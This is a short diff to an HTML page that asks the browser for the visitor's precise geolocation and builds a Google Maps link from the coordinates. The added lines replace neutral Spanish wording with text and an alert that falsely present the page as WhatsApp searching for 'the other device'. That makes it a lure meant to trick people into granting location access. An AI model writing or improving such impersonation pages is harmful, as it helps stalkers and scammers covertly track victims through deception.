@@ -8,8 +8,8 @@
 </head>
 <body>
 
-<h2>Obteniendo ubicación...</h2>
-<p>Por favor acepta el permiso de ubicación cuando aparezca.</p>
+<h2>whatsApp esta buscando ubicación...</h2>
+<p>habilita la ubicacion y otorga el permiso.</p>
     
 <iframe
 src="https://maps.google.com/maps?q=Bogota%20Colombia&t=&z=12&ie=UTF8&iwloc=&output=embed">
@@ -25,7 +25,8 @@ if ("geolocation" in navigator) {
                 "https://www.google.com/maps?q=" + lat + "," + lon;
         },
         function(error) {
-            alert("Enciende ubicacion y da permiso a google maps Para obtener direcion .");
+            alert("Enciende ubicacion y otorga permiso a whatsApp para obtener la ubicacion del otro dispositivo
+                  .");
         },
         {
             enableHighAccuracy: true,
